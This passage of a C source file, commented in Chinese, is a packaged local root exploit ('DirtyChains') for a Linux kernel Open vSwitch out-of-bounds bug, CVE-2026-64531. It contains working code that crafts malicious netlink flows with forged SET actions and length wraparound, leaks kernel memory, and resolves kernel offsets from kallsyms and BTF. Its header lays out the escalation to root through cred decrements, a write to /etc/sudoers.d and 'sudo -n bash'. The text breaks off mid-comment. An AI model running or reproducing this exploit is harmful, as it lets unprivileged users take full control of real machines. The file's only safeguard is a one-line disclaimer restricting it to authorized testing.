/* ============================================================================
 *  dirtyfrag-gui.c — DirtyChains 六链页缓存提权 PoC
 *                    图形前端 + 内置引擎（单文件）
 *
 *  本文件由两部分合并而成，一个 .c 就能编出完整程序，不再需要额外的 .o：
 *
 *      第一部分  OVS 引擎（原 ovswrap.c 全文）
 *                CVE-2026-64531 net/openvswitch CT action 越界，入口 ovswrap_main
 *      第二部分  GTK3 前端（本项目前身 dirtyfrag-gui.c）
 *                六链下拉框 + pty 运行器 + ANSI 日志渲染，入口 main
 *
 *  编译（GUI）:
 *      gcc -O2 -Wall -o dirtychains dirtyfrag-gui.c \
 *          $(pkg-config --cflags --libs gtk+-3.0) -lutil
 *
 *  只编 OVS 命令行版（不含 GTK，不链接 gtk3）:
 *      gcc -O2 -Wall -DOVSWRAP_STANDALONE -o ovswrap dirtyfrag-gui.c
 *
 *  仅用于自有机器或明确授权的测试环境。
 * ==========================================================================*/

#ifdef OVSWRAP_STANDALONE
#define ovswrap_main main
#endif

/*
 * CVE-2026-64531  net/openvswitch：CT action 解析越界 -> 伪造 SET action
 *
 * 这是 ovswrap-poc.py 的 C 移植版，用于并进 GUI 的单二进制引擎。
 * 攻击面与 Python 原版完全一致：
 *
 *   非特权用户 -> unshare(CLONE_NEWUSER|CLONE_NEWNET)
 *              -> 在私有 netns 里建 OVS datapath（netlink generic）
 *              -> 用 CLONE 把 400 个 CT action 塞进一条 flow
 *              -> OVS_CT_ATTR_LABELS / OVS_CT_ATTR_TIMEOUT 溢出到下一个
 *                 action 的边界，被当成 OVS_ACTION_ATTR_SET 解析
 *              -> fake SET 里的 OVS_KEY_ATTR_TUNNEL_INFO 指向任意
 *                 ip_tunnel_info，读取时把目标内存回显到 tunnel key 里
 *              -> 写原语是 dst_release()：对伪造的 dst_entry 递减引用计数，
 *                 一次 -1，可以对 cred 的 fsuid/fsgid 连续递减到 0
 *              -> 被改成 root 身份的 host 子进程写 /etc/sudoers.d
 *              -> sudo -n bash
 *
 * 与 Python 版的差异：
 *   1. 808 条预置内核记录不再编进二进制，改成分目录的纯文本表
 *      offset/<N>系/<release>/target.h：换内核只要加一个目录，不用重编。
 *      命中配置表就不需要 BTF / pahole / System.map，没命中才动态推导。
 *   2. 不再 exec 自身进 namespace，直接 unshare(2)。
 *   3. 所有 netlink 报文用内存缓冲区拼，不再依赖 struct 序列化。
 *
 * 仅用于自有机器或明确授权的测试环境。
 */

#define _GNU_SOURCE

#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <net/if.h>
#include <pwd.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define OVSWRAP_VERSION "0.1"

/* -------------------------------------------------------------------------
 * 常量
 * ---------------------------------------------------------------------- */

#define NLM_F_REQUEST 0x01
#define NLM_F_ACK     0x04
#define NLM_F_CREATE  0x400
#define NETLINK_GENERIC 16
#define GENL_ID_CTRL  0x10
#define CTRL_CMD_GETFAMILY 3
#define CTRL_ATTR_FAMILY_ID 1
#define CTRL_ATTR_FAMILY_NAME 2

#define OVS_DATAPATH_VERSION 2
#define OVS_FLOW_VERSION 1

#define OVS_DP_CMD_NEW 1
#define OVS_DP_ATTR_NAME 1
#define OVS_DP_ATTR_UPCALL_PID 2
#define OVS_DP_ATTR_USER_FEATURES 5

#define OVS_FLOW_CMD_NEW 1
#define OVS_FLOW_CMD_DEL 2
#define OVS_FLOW_CMD_GET 3
#define OVS_FLOW_ATTR_KEY 1
#define OVS_FLOW_ATTR_ACTIONS 2

#define OVS_KEY_ATTR_IN_PORT 3
#define OVS_KEY_ATTR_ETHERNET 4
#define OVS_KEY_ATTR_ETHERTYPE 6
#define OVS_KEY_ATTR_IPV4 7
#define OVS_KEY_ATTR_TCP 9
#define OVS_KEY_ATTR_TUNNEL 16
#define OVS_KEY_ATTR_TCP_FLAGS 18
/* 默认值；配置表给出别的值时用表里的（历史版本是 29） */
#define OVS_KEY_ATTR_TUNNEL_INFO 31

#define OVS_ACTION_ATTR_OUTPUT 1
#define OVS_ACTION_ATTR_SET 3
#define OVS_ACTION_ATTR_POP_VLAN 5
#define OVS_ACTION_ATTR_CT 12
#define OVS_ACTION_ATTR_CLONE 20

#define OVS_CT_ATTR_COMMIT 1
#define OVS_CT_ATTR_LABELS 4
#define OVS_CT_ATTR_HELPER 5
#define OVS_CT_ATTR_TIMEOUT 9

#define OVS_TUNNEL_KEY_ATTR_IPV4_SRC 1
#define OVS_TUNNEL_KEY_ATTR_IPV4_DST 2
#define OVS_TUNNEL_KEY_ATTR_TOS 3
#define OVS_TUNNEL_KEY_ATTR_TTL 4
#define OVS_TUNNEL_KEY_ATTR_TP_SRC 9
#define OVS_TUNNEL_KEY_ATTR_TP_DST 10
#define OVS_TUNNEL_KEY_ATTR_IPV4_INFO_BRIDGE 16

#define ETH_P_IP 0x0800
#define IPPROTO_TCP 6
#define CT_ACTION_COUNT 400
#define NLA_HDR_LEN 4

#define BTF_VMLINUX "/sys/kernel/btf/vmlinux"

/* -------------------------------------------------------------------------
 * 日志：和 GUI 的 ANSI 解析器保持同一套颜色
 * ---------------------------------------------------------------------- */

static int g_color = 1;
/* fake SET 里 OVS_KEY_ATTR_TUNNEL_INFO 的 attr id：配置表命中时会被改写 */
static int g_tun_info = OVS_KEY_ATTR_TUNNEL_INFO;

#define C_RST "\033[0m"
#define C_DIM "\033[2m"
#define C_CYA "\033[36m"
#define C_GRN "\033[32m"
#define C_YEL "\033[33m"
#define C_RED "\033[31m"
#define C_MAG "\033[35m"

static void pr_raw(const char *fmt, ...)
{
    va_list ap;

    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    fflush(stdout);
}

static void pr_dim(const char *fmt, ...)
{
    va_list ap;

    if (g_color)
        fputs(C_DIM, stdout);
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    if (g_color)
        fputs(C_RST, stdout);
    fflush(stdout);
}

static void pr_err(const char *fmt, ...)
{
    va_list ap;

    if (g_color)
        fputs(C_RED, stdout);
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    if (g_color)
        fputs(C_RST, stdout);
    fflush(stdout);
}

static void pr_ok(const char *fmt, ...)
{
    va_list ap;

    if (g_color)
        fputs(C_GRN, stdout);
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    if (g_color)
        fputs(C_RST, stdout);
    fflush(stdout);
}

static void pr_step(const char *fmt, ...)
{
    va_list ap;

    pr_raw("\n");
    if (g_color)
        fputs(C_MAG "***" C_RST, stdout);
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    if (g_color)
        fputs(C_MAG "***" C_RST "\n", stdout);
    else
        pr_raw("\n");
    fflush(stdout);
}

/* -------------------------------------------------------------------------
 * 动态缓冲区：所有 netlink 报文都拼在这里
 * ---------------------------------------------------------------------- */

struct buf {
    unsigned char *p;
    size_t len;
    size_t cap;
};

static void buf_init(struct buf *b, size_t cap)
{
    b->p = malloc(cap);
    b->len = 0;
    b->cap = b->p ? cap : 0;
}

static void buf_free(struct buf *b)
{
    free(b->p);
    b->p = NULL;
    b->len = b->cap = 0;
}

static int buf_reserve(struct buf *b, size_t extra)
{
    size_t need = b->len + extra;

    if (need <= b->cap)
        return 0;
    while (b->cap < need)
        b->cap = b->cap ? b->cap * 2 : 4096;
    b->p = realloc(b->p, b->cap);
    return b->p ? 0 : -1;
}

static void buf_put(struct buf *b, const void *data, size_t len)
{
    if (buf_reserve(b, len) != 0)
        return;
    memcpy(b->p + b->len, data, len);
    b->len += len;
}

static void buf_u16(struct buf *b, uint16_t v)
{
    buf_put(b, &v, 2);
}

static void buf_u32(struct buf *b, uint32_t v)
{
    buf_put(b, &v, 4);
}

static void buf_align4(struct buf *b)
{
    static const unsigned char zero[4];

    while (b->len & 3)
        buf_put(b, zero, 1);
}

/* 追加一个 netlink attribute，长度自动回填 */
static size_t nla_put(struct buf *b, uint16_t type, const void *data, size_t len)
{
    size_t start = b->len;
    uint16_t total = (uint16_t)(NLA_HDR_LEN + len);

    buf_u16(b, total);
    buf_u16(b, type);
    if (len)
        buf_put(b, data, len);
    buf_align4(b);
    return start;
}

/* 嵌套 attribute：先占 4 字节，填完再回填长度 */
static size_t nla_nest_start(struct buf *b, uint16_t type)
{
    size_t start = b->len;

    buf_u16(b, 0);
    buf_u16(b, type);
    return start;
}

static void nla_nest_end(struct buf *b, size_t start)
{
    uint16_t total = (uint16_t)(b->len - start);

    memcpy(b->p + start, &total, 2);
    buf_align4(b);
}

/* -------------------------------------------------------------------------
 * generic netlink
 * ---------------------------------------------------------------------- */

struct genl {
    int fd;
    uint32_t seq;
};

static int genl_open(struct genl *g)
{
    struct sockaddr_nl sa;

    g->fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (g->fd < 0)
        return -1;
    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;
    if (bind(g->fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(g->fd);
        g->fd = -1;
        return -1;
    }
    g->seq = 1;
    return 0;
}

/*
 * 发一条 generic netlink 请求并取回所有同 seq 的应答。
 * ack_mode: 1 = 期待 NLMSG_ERROR(0) 才算完成（NLM_F_ACK）
 */
static int genl_xchg(struct genl *g, int family, uint8_t cmd, uint8_t version,
                     const void *payload, size_t plen, int flags,
                     struct buf *reply)
{
    struct buf msg;
    struct nlmsghdr *nh;
    struct genlmsghdr {
        uint8_t cmd;
        uint8_t version;
        uint16_t reserved;
    } gh;
    uint32_t seq = g->seq++;
    unsigned char rx[1 << 16];
    int want_ack = (flags & NLM_F_ACK) != 0;
    int got_any = 0;

    if (reply)
        reply->len = 0;

    buf_init(&msg, 64 + plen);
    if (!msg.p) {
        buf_free(&msg);
        return -ENOMEM;
    }

    buf_u32(&msg, 0);                      /* len 稍后回填 */
    buf_u16(&msg, (uint16_t)family);
    buf_u16(&msg, (uint16_t)flags);
    buf_u32(&msg, seq);
    buf_u32(&msg, 0);

    gh.cmd = cmd;
    gh.version = version;
    gh.reserved = 0;
    buf_put(&msg, &gh, sizeof(gh));
    if (plen)
        buf_put(&msg, payload, plen);

    {
        uint32_t total = (uint32_t)msg.len;

        memcpy(msg.p, &total, 4);
    }

    nh = (struct nlmsghdr *)msg.p;
    (void)nh;

    if (send(g->fd, msg.p, msg.len, 0) < 0) {
        int e = errno;

        buf_free(&msg);
        return -e;
    }
    buf_free(&msg);

    for (;;) {
        ssize_t n = recv(g->fd, rx, sizeof(rx), 0);
        size_t off = 0;

        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -errno;
        }

        while (off + 16 <= (size_t)n) {
            const struct nlmsghdr *h = (const struct nlmsghdr *)(rx + off);
            size_t mlen = h->nlmsg_len;
            const unsigned char *body;
            size_t blen;

            if (mlen < 16 || off + mlen > (size_t)n)
                break;
            if (h->nlmsg_seq != seq) {
                off += NLMSG_ALIGN(mlen);
                continue;
            }

            body = rx + off + 16;
            blen = mlen - 16;

            if (h->nlmsg_type == NLMSG_ERROR) {
                int err = 0;

                if (blen >= 4)
                    memcpy(&err, body, 4);
                if (err == 0) {
                    if (want_ack || got_any)
                        return 0;
                    return 0;
                }
                return err;            /* 负数 errno */
            }

            if (reply && h->nlmsg_type != NLMSG_NOOP)
                buf_put(reply, body, blen);
            got_any = 1;
            off += NLMSG_ALIGN(mlen);
        }

        /* 不带 ACK 的请求：收到一条应答就可以返回 */
        if (!want_ack && got_any)
            return 0;
    }
}

static int genl_get_family(struct genl *g, const char *name, int *out)
{
    struct buf payload, reply;
    int ret;

    buf_init(&payload, 64);
    buf_init(&reply, 4096);
    if (!payload.p || !reply.p) {
        buf_free(&payload);
        buf_free(&reply);
        return -ENOMEM;
    }

    nla_put(&payload, CTRL_ATTR_FAMILY_NAME, name, strlen(name) + 1);

    ret = genl_xchg(g, GENL_ID_CTRL, CTRL_CMD_GETFAMILY, 2,
                    payload.p, payload.len, NLM_F_REQUEST, &reply);
    buf_free(&payload);
    if (ret < 0) {
        buf_free(&reply);
        return ret;
    }

    /* reply 是 genlmsghdr(4) + attrs */
    {
        size_t off = 4;
        int found = 0;

        while (off + 4 <= reply.len) {
            uint16_t alen, atype;

            memcpy(&alen, reply.p + off, 2);
            memcpy(&atype, reply.p + off + 2, 2);
            if (alen < 4 || off + alen > reply.len)
                break;
            if (atype == CTRL_ATTR_FAMILY_ID && alen >= 6) {
                uint16_t id;

                memcpy(&id, reply.p + off + 4, 2);
                *out = id;
                found = 1;
                break;
            }
            off += (alen + 3) & ~3u;
        }
        buf_free(&reply);
        return found ? 0 : -ENOENT;
    }
}

/* -------------------------------------------------------------------------
 * OVS 报文构造
 * ---------------------------------------------------------------------- */

/* 一条 flow 的 key：固定 IPv4/TCP 五元组，seq 只用来避免重复 */
static void flow_key(struct buf *out, int seq)
{
    uint32_t src = 0x0A000000u | (uint32_t)((seq & 0xFFFF) + 1);
    uint32_t dst = 0x0A0000FEu;
    uint16_t sport = (uint16_t)(10000 + (seq % 50000));
    uint16_t dport = 443;
    uint16_t ethertype = ETH_P_IP;
    uint16_t tcpflags = 0;
    uint32_t in_port = 0;
    unsigned char eth[12] = { 0x02, 0, 0, 0, 0, 1, 0x02, 0, 0, 0, 0, 2 };
    unsigned char ipv4[12];
    unsigned char tcp[4];

    memcpy(ipv4 + 0, &src, 4);
    memcpy(ipv4 + 4, &dst, 4);
    ipv4[8] = IPPROTO_TCP;
    ipv4[9] = 0;
    ipv4[10] = 64;
    ipv4[11] = 0;

    memcpy(tcp + 0, &sport, 2);
    memcpy(tcp + 2, &dport, 2);

    nla_put(out, OVS_KEY_ATTR_IN_PORT, &in_port, 4);
    nla_put(out, OVS_KEY_ATTR_ETHERNET, eth, sizeof(eth));
    nla_put(out, OVS_KEY_ATTR_ETHERTYPE, &ethertype, 2);
    nla_put(out, OVS_KEY_ATTR_IPV4, ipv4, sizeof(ipv4));
    nla_put(out, OVS_KEY_ATTR_TCP, tcp, sizeof(tcp));
    nla_put(out, OVS_KEY_ATTR_TCP_FLAGS, &tcpflags, 2);
}

/* OVS_ACTION_ATTR_CT{ COMMIT, extra... } */
static void ct_action(struct buf *out, const void *extra, size_t elen)
{
    size_t nest = nla_nest_start(out, OVS_ACTION_ATTR_CT);

    nla_put(out, OVS_CT_ATTR_COMMIT, NULL, 0);
    if (elen)
        buf_put(out, extra, elen);
    nla_nest_end(out, nest);
}

/*
 * helper 泄漏：labels 里塞一个假的 OUTPUT action（len=512），
 * 后面紧跟 400 个 CT{COMMIT, HELPER}。OVS 解析 labels 时会把
 * 紧邻内存当成 action 链继续读，fake OUTPUT 的 512 字节 payload
 * 就会被原样回显到 flow get 的应答里 —— 里面是 nf_conntrack_helper。
 */
static void clone_with_helper_leak(struct buf *out, const void *fake, size_t flen)
{
    unsigned char labels[32];
    unsigned char helper_attr[8] = { 8, 0, OVS_CT_ATTR_HELPER, 0, 'f', 't', 'p', 0 };
    struct buf extra;
    size_t nest;
    int i;

    memset(labels, 0, sizeof(labels));
    if (flen > 32 - 20)
        flen = 32 - 20;
    memcpy(labels + 20, fake, flen);

    buf_init(&extra, 128);
    nla_put(&extra, OVS_CT_ATTR_LABELS, labels, sizeof(labels));
    nla_put(&extra, OVS_CT_ATTR_HELPER, helper_attr + 4, 4);   /* "ftp\0" */

    nest = nla_nest_start(out, OVS_ACTION_ATTR_CLONE);
    ct_action(out, extra.p, extra.len);
    for (i = 1; i < CT_ACTION_COUNT; i++)
        ct_action(out, helper_attr, sizeof(helper_attr));
    nla_nest_end(out, nest);
    buf_free(&extra);
}

/*
 * fake SET 载体 A：CT_ATTR_TIMEOUT。
 * timeout attr 的 32 字节 payload 里，前 4 字节会落到 "下一个 action" 的
 * nlattr 头上：len=0xFFFF, type=OVS_ACTION_ATTR_SET，于是解析器把后面的
 * 32 字节当成一个 SET，里面再套 TUNNEL_INFO(len=12)，指向 tun_dst。
 */
static void clone_with_fake_set_timeout(struct buf *out, uint64_t tun_dst)
{
    unsigned char labels[32];
    unsigned char timeout[32];
    struct buf extra;
    size_t nest;
    int i;

    memset(labels, 0, sizeof(labels));
    memset(timeout, 0, sizeof(timeout));

    /* labels[20..24] = {len=0xffff, type=SET} */
    labels[20] = 0xFF;
    labels[21] = 0xFF;
    labels[22] = OVS_ACTION_ATTR_SET;
    labels[23] = 0;
    /* labels[24..28] = {len=12, type=TUNNEL_INFO} */
    labels[24] = 12;
    labels[25] = 0;
    labels[26] = (unsigned char)g_tun_info;
    labels[27] = 0;
    /* labels[28..32] = tun_dst 低 32 位 */
    memcpy(labels + 28, &tun_dst, 4);

    /* timeout[0..4] = tun_dst 高 32 位 */
    memcpy(timeout, (const unsigned char *)&tun_dst + 4, 4);

    buf_init(&extra, 1024);
    nla_put(&extra, OVS_CT_ATTR_LABELS, labels, sizeof(labels));
    nla_put(&extra, OVS_CT_ATTR_TIMEOUT, timeout, sizeof(timeout));

    nest = nla_nest_start(out, OVS_ACTION_ATTR_CLONE);
    ct_action(out, extra.p, extra.len);
    for (i = 1; i < CT_ACTION_COUNT; i++)
        ct_action(out, NULL, 0);
    nla_nest_end(out, nest);
    buf_free(&extra);
}

/* labels-only 计划的参数：把 total_ct 和 padding 数量算出来 */
static int labels_only_plan(int ct_action_len, int labels_off,
                            int *total_out, int *pad_out)
{
    int fake_offset = 16;
    int target_wrap;
    int best_score = -1, best_total = 0, best_pad = 0;
    int n;

    if (ct_action_len < 8 || (ct_action_len & 3))
        return -1;

    target_wrap = 8 + labels_off + fake_offset;
    if (target_wrap >= 0x10000 || (target_wrap & 3))
        return -1;

    for (n = 360; n <= 420; n++) {
        int base_wrap = (4 + n * ct_action_len) & 0xFFFF;
        int diff = (target_wrap - base_wrap) & 0xFFFF;
        int pad_count = diff / 4;
        int true_len = 4 + n * ct_action_len + pad_count * 4;
        int score;

        if (true_len <= 0xFFFF || pad_count > 256)
            continue;
        score = pad_count + abs(n - 400);
        if (best_score < 0 || score < best_score) {
            best_score = score;
            best_total = n;
            best_pad = pad_count;
        }
    }

    if (best_score < 0)
        return -1;
    *total_out = best_total;
    *pad_out = best_pad;
    return 0;
}

/*
 * fake SET 载体 B：只用 LABELS。
 * 这里不靠"下一个 attr"，而是让整个 clone 的 action 总长度超过 0xFFFF，
 * 被内核截断成 16 位长度后回绕到 labels 内部，fake SET 正好落在
 * labels+16 的位置。补若干个 POP_VLAN 把长度凑到目标回绕点。
 */
static void clone_with_fake_set_labels_only(struct buf *out, uint64_t tun_dst,
                                            int ct_action_len, int labels_off)
{
    int total = 0, pad = 0;
    int fake_offset = 16;
    unsigned char labels[32];
    struct buf extra;
    size_t nest;
    int i;

    if (labels_only_plan(ct_action_len, labels_off, &total, &pad) != 0)
        return;

    memset(labels, 0, sizeof(labels));
    labels[fake_offset + 0] = 0xFF;
    labels[fake_offset + 1] = 0xFF;
    labels[fake_offset + 2] = OVS_ACTION_ATTR_SET;
    labels[fake_offset + 3] = 0;
    labels[fake_offset + 4] = 12;
    labels[fake_offset + 5] = 0;
    labels[fake_offset + 6] = (unsigned char)g_tun_info;
    labels[fake_offset + 7] = 0;
    memcpy(labels + fake_offset + 8, &tun_dst, 8);

    buf_init(&extra, 64);
    nla_put(&extra, OVS_CT_ATTR_LABELS, labels, sizeof(labels));

    nest = nla_nest_start(out, OVS_ACTION_ATTR_CLONE);
    ct_action(out, extra.p, extra.len);
    for (i = 1; i < total; i++)
        ct_action(out, NULL, 0);
    for (i = 0; i < pad; i++)
        nla_put(out, OVS_ACTION_ATTR_POP_VLAN, NULL, 0);
    nla_nest_end(out, nest);
    buf_free(&extra);
}

enum carrier {
    CARRIER_TIMEOUT = 0,
    CARRIER_LABELS_ONLY = 1,
    CARRIER_AUTO = 2,
};

static void clone_with_fake_set(struct buf *out, int carrier, uint64_t tun_dst,
                                int ct_action_len, int labels_off)
{
    if (carrier == CARRIER_TIMEOUT)
        clone_with_fake_set_timeout(out, tun_dst);
    else
        clone_with_fake_set_labels_only(out, tun_dst, ct_action_len, labels_off);
}

/* -------------------------------------------------------------------------
 * 内核偏移：pahole 读 BTF，符号读 kallsyms / System.map
 * ---------------------------------------------------------------------- */

struct koffs {
    unsigned long vmlinux_module_ktype;   /* module_ktype - _text */
    unsigned long vmlinux_init_pid_ns;    /* init_pid_ns  - _text */

    int nf_conntrack_helper_me;
    int module_kobj_ktype;
    int task_pid;
    int task_cred;
    int task_pid_links;
    int cred_fsuid;
    int cred_fsgid;
    int cred_cap_permitted;
    int cred_cap_effective;
    int pid_namespace_idr;
    int idr_idr_rt;
    int idr_base;
    int xarray_xa_head;
    int xa_node_shift;
    int xa_node_slots;
    int pid_tasks;
    int hlist_head_first;
    int dst_entry_ref;
    int ref_kind;                  /* 0 = __rcuref, 1 = __refcnt */
    int metadata_dst_tun_info;
    int ip_tunnel_key_ipv4_src;
    int ip_tunnel_key_ipv4_dst;
    int ip_tunnel_key_tos;
    int ip_tunnel_key_ttl;
    int ip_tunnel_key_tp_src;
    int ip_tunnel_key_tp_dst;
    int ovs_ct_labels;
    int ovs_ct_action_len;
};

static int g_verbose;

static int run_cmd(const char *cmd, char *out, size_t outlen)
{
    FILE *f;
    size_t n;

    f = popen(cmd, "r");
    if (!f)
        return -1;
    n = fread(out, 1, outlen - 1, f);
    out[n] = '\0';
    pclose(f);
    return (int)n;
}

static int have_binary(const char *name)
{
    const char *path = getenv("PATH");
    char buf[1024];
    const char *p;

    if (!path)
        path = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";

    p = path;
    while (*p) {
        const char *q = strchr(p, ':');
        size_t len = q ? (size_t)(q - p) : strlen(p);

        if (len && len < sizeof(buf) - 64) {
            snprintf(buf, sizeof(buf), "%.*s/%s", (int)len, p, name);
            if (access(buf, X_OK) == 0)
                return 1;
        }
        if (!q)
            break;
        p = q + 1;
    }
    return 0;
}

/*
 * pahole -C <type> <btf> 的输出里，字段行形如：
 *      int                        pid;                  / *     0     4 * /
 * 我们只要这条注释里的第一个数。
 */
static int parse_field_offset(const char *text, const char *type,
                              const char *field, int *out)
{
    const char *line = text;
    size_t flen = strlen(field);

    (void)type;

    while (line && *line) {
        const char *nl = strchr(line, '\n');
        size_t len = nl ? (size_t)(nl - line) : strlen(line);
        char tmp[512];
        const char *hit = NULL;
        const char *p;

        if (len >= sizeof(tmp))
            len = sizeof(tmp) - 1;
        memcpy(tmp, line, len);
        tmp[len] = '\0';

        /* 在行内找 field，且前后必须是"标识符边界" */
        for (p = tmp; (p = strstr(p, field)) != NULL; p += flen) {
            char before = (p == tmp) ? ' ' : p[-1];
            char after = p[flen];

            if ((before == ' ' || before == '\t' || before == '*' ||
                 before == ')' || before == '(') &&
                (after == ';' || after == '[' || after == ')' ||
                 after == ' ' || after == '\t')) {
                hit = p;
                break;
            }
        }

        if (hit && strstr(tmp, "/*")) {
            const char *c = strstr(tmp, "/*");
            int off = -1, size = -1;

            if (sscanf(c, "/* %d %d", &off, &size) == 2 && off >= 0) {
                *out = off;
                return 0;
            }
        }

        line = nl ? nl + 1 : NULL;
    }
    return -1;
}

/*
 * 结构体可能不在 vmlinux 里：nf_conntrack_helper 在 nf_conntrack 模块，
 * ovs_conntrack_info 在 openvswitch 模块。所以按 vmlinux -> btf 目录下
 * 每个模块文件的顺序挨个试，记住上次命中的文件，下次先试它。
 */
#define BTF_DIR "/sys/kernel/btf"
#define BTF_MAX 320

static char g_btf_paths[BTF_MAX][256];
static int g_btf_count;
static int g_btf_pref = -1;

static void btf_collect(void)
{
    DIR *d;
    struct dirent *e;
    char release[128], path[256];

    if (g_btf_count)
        return;

    snprintf(g_btf_paths[g_btf_count++], 256, "%s", BTF_VMLINUX);

    d = opendir(BTF_DIR);
    if (d) {
        while ((e = readdir(d)) != NULL && g_btf_count < BTF_MAX) {
            if (e->d_name[0] == '.' || !strcmp(e->d_name, "vmlinux"))
                continue;
            snprintf(g_btf_paths[g_btf_count++], 256, "%s/%.200s", BTF_DIR, e->d_name);
        }
        closedir(d);
    }

    if (run_cmd("uname -r", release, sizeof(release)) > 0) {
        release[strcspn(release, "\n")] = '\0';
        snprintf(path, sizeof(path), "/boot/vmlinux-%s", release);
        if (access(path, R_OK) == 0 && g_btf_count < BTF_MAX)
            snprintf(g_btf_paths[g_btf_count++], 256, "%s", path);
        snprintf(path, sizeof(path), "/usr/lib/debug/boot/vmlinux-%s", release);
        if (access(path, R_OK) == 0 && g_btf_count < BTF_MAX)
            snprintf(g_btf_paths[g_btf_count++], 256, "%s", path);
    }
}

static int pahole_dump(const char *type, char *out, size_t outlen)
{
    char cmd[1024];
    int i, tried = 0;

    btf_collect();

    for (i = -1; i < g_btf_count; i++) {
        int idx = (i < 0) ? g_btf_pref : i;

        if (idx < 0 || idx >= g_btf_count)
            continue;
        if (i >= 0 && idx == g_btf_pref)
            continue;               /* 刚才已经试过 */
        tried++;

        snprintf(cmd, sizeof(cmd), "pahole -C %s %s 2>/dev/null",
                 type, g_btf_paths[idx]);
        if (run_cmd(cmd, out, outlen) <= 0)
            continue;
        if (!strstr(out, "struct ") && !strstr(out, "union "))
            continue;
        g_btf_pref = idx;
        return 0;
    }

    if (!tried)
        return -1;
    return -1;
}

static int koff_field(const char *type, const char *field, int *out)
{
    static char text[1 << 16];
    static char cached_type[64];
    static int cached = -1;

    if (!cached_type[0] || strcmp(cached_type, type)) {
        cached = pahole_dump(type, text, sizeof(text));
        snprintf(cached_type, sizeof(cached_type), "%s", type);
    }
    if (cached != 0) {
        pr_err("  pahole 读不到 struct %s（%s）\n", type, BTF_VMLINUX);
        return -1;
    }
    if (parse_field_offset(text, type, field, out) != 0) {
        pr_err("  struct %s 里找不到字段 %s\n", type, field);
        return -1;
    }
    return 0;
}

static int koff_struct_size(const char *type, int *out)
{
    static char text[1 << 16];
    const char *p;

    if (pahole_dump(type, text, sizeof(text)) != 0) {
        pr_err("  pahole 读不到 struct %s\n", type);
        return -1;
    }
    p = strstr(text, "size:");
    if (!p || sscanf(p, "size: %d", out) != 1) {
        pr_err("  struct %s 的 size 解析失败\n", type);
        return -1;
    }
    return 0;
}

/* 从 kallsyms / System.map 取三个符号的绝对地址 */
static int read_symbol_triplet(const char *path, unsigned long *text,
                               unsigned long *mtype, unsigned long *pidns)
{
    FILE *f = fopen(path, "r");
    char line[512];
    int got = 0;

    if (!f)
        return -1;

    *text = *mtype = *pidns = 0;

    while (fgets(line, sizeof(line), f)) {
        unsigned long addr;
        char type, name[256];

        if (sscanf(line, "%lx %c %255s", &addr, &type, name) != 3)
            continue;
        if (!strcmp(name, "_text")) {
            *text = addr;
            got |= 1;
        } else if (!strcmp(name, "module_ktype")) {
            *mtype = addr;
            got |= 2;
        } else if (!strcmp(name, "init_pid_ns")) {
            *pidns = addr;
            got |= 4;
        }
        if (got == 7)
            break;
    }
    fclose(f);

    if (got != 7 || !*text || !*mtype || !*pidns)
        return -1;
    return 0;
}

static int derive_symbols(struct koffs *k)
{
    char release[128];
    char path[512];
    unsigned long text = 0, mtype = 0, pidns = 0;
    static const char *fixed[] = {
        "/boot/System.map", "/proc/kallsyms",
    };
    int i;

    {
        char cmd[256];

        if (run_cmd("uname -r", release, sizeof(release)) <= 0)
            return -1;
        release[strcspn(release, "\n")] = '\0';
        (void)cmd;
    }

    snprintf(path, sizeof(path), "/boot/System.map-%s", release);
    if (read_symbol_triplet(path, &text, &mtype, &pidns) == 0)
        goto done;

    for (i = 0; i < (int)(sizeof(fixed) / sizeof(fixed[0])); i++) {
        if (read_symbol_triplet(fixed[i], &text, &mtype, &pidns) == 0)
            goto done;
    }

    snprintf(path, sizeof(path), "/usr/lib/debug/boot/System.map-%s", release);
    if (read_symbol_triplet(path, &text, &mtype, &pidns) == 0)
        goto done;

    snprintf(path, sizeof(path), "/lib/modules/%s/build/System.map", release);
    if (read_symbol_triplet(path, &text, &mtype, &pidns) == 0)
        goto done;

    return -1;

done:
    if (mtype <= text || pidns <= text) {
        pr_err("  符号地址异常：_text=0x%lx module_ktype=0x%lx init_pid_ns=0x%lx\n",
               text, mtype, pidns);
        return -1;
    }
    k->vmlinux_module_ktype = mtype - text;
    k->vmlinux_init_pid_ns = pidns - text;
    return 0;
}

/* -------------------------------------------------------------------------
 * 偏移配置表的命中状态
 *
 * 表在 offset/<N>系/<release>/target.h，由 -dump-target 生成、th_load() 解析。
 * 命中的那条放在 g_krec_hit 里：行为参数（读写 carrier、tunnel_info、
 * lane 顺序）推不出来，只能实测后写进表里。
 * ---------------------------------------------------------------------- */
#define KREC_LANE_MAX 14

struct krec_hit {
    int hit;
    int exact;
    int read_carrier;
    int write_carrier;
    int tunnel_info;
    int lane_count;
    int lane_order[KREC_LANE_MAX];
    char release[128];
};
static struct krec_hit g_krec_hit;
static int g_force_derive;
static const char *g_krec_force;   /* -krec <release>：手动指定记录 */

static unsigned long fnv1a32(const char *s)
{
    unsigned long h = 0x811C9DC5UL;

    while (*s) {
        h ^= (unsigned char)*s++;
        h = (h * 0x01000193UL) & 0xFFFFFFFFUL;
    }
    return h;
}

/* -------------------------------------------------------------------------
 * 外部配置表：offset/<N>系/<release>/target.h
 *
 * 配置表现在是唯一数据源（原先内嵌的 808 条已全部导出成 offset/ 目录树）。
 * 新增内核不必重编二进制，直接建目录：
 *
 *     offset/5系/5.8.0-59-generic/target.h
 *
 * target.h 就是一组 #define，程序逐行解析；它同时也是合法 C 头文件，
